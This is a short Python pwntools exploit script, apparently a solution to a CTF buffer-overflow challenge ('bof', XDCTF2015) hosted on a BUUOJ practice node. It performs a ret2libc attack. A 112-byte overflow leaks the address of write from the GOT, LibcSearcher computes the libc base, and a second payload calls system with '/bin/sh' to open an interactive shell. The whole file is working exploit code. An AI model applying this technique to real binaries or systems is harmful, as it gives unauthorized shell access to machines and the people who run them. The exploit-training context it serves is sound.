#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
sh = process("./bof")
sh = remote("node3.buuoj.cn",28489)
elf = ELF("./bof")
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = 0x804851C
# gdb.attach(sh)
# pause()
payload = 'a' * 112 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
sh.sendline(payload)
sh.recvuntil("Welcome to XDCTF2015~!\n")
write_addr = u32(sh.recv(4))
libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * 112 + p32(system_addr) * 2 + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()